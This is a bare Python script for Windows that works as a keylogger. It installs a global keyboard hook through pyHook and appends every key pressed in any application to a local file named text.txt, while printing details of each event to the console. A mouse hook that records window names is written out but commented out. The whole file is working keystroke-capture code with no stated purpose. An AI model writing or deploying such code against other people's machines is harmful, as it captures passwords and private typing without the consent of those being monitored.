from ctypes import *
import pyHook
import pythoncom
import time

def WriteFile(string):
    fp = open("text.txt", "a")
    fp.write(string)
    fp.close()

def onMouseEvent(event):
    print('--------------------------------------------')
    windowTitle = create_string_buffer(512)
    windll.user32.GetWindowTextA(event.Window,byref(windowTitle),512)
    windowName = windowTitle.value.decode('GBK')
    WriteFile(event.WindowName)
	
    print("MessageName:",event.MessageName)
    print("Message:", event.Message)
    print("Time:", event.Time)
    print("Window:", event.Window)
    print("WindowName:", event.WindowName)
    print("Position:", event.Position)
    print("Wheel:", event.Wheel)
    print("Injected:", event.Injected)
    print("---")
	
    return True
   
def onKeyboardEvent(event):
    print('--------------------------------------------')
    windowTitle = create_string_buffer(512)
    windll.user32.GetWindowTextA(event.Window,byref(windowTitle),512)
    windowName = windowTitle.value.decode('gbk')
    WriteFile(event.Key)

    print('MessageName:',event.MessageName)
    print('Message:',event.Message)
    print('Time:', time.ctime(time.time()))
    print('Window:',event.Window)
    print('WindowName:',event.WindowName)
    print('Ascii:', event.Ascii, chr(event.Ascii))
    print('Key:', event.Key)
    print('KeyID:', event.KeyID)
    print('ScanCode:', event.ScanCode)
    print('Extended:', event.Extended)
    print('Injected:', event.Injected)
    print('Alt', event.Alt)
    print('Transition', event.Transition)
    print('---')
	
    return True

WriteFile("\r\n")
#print('start mouse hook...')
#hm = pyHook.HookManager()
#hm.MouseAll = onMouseEvent
#hm.HookMouse()
#pythoncom.PumpMessages()

print('start keyboard hook...')
hm = pyHook.HookManager()
hm.KeyDown = onKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
